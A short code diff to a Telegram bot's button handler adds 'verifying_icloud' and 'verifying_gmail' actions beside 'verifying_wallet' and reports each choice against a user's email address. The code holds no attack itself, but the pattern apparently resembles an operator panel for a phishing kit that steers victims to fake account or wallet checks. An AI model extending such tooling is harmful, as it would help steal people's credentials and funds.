@@ -189,6 +189,10 @@ bot.on("callback_query", async (query) => {
             choiceText = 'Done 🏁';
           } else if (action === 'verifying_wallet') {
             choiceText = 'Wallet 💼';
+          } else if (action === 'verifying_icloud') {
+            choiceText = '☁️';
+          } else if (action === 'verifying_gmail') {
+            choiceText = '🌈';
           }
           
           const statusMsg = `📧 <code>${verifyEmail}</code> → <b>${choiceText}</b>`;
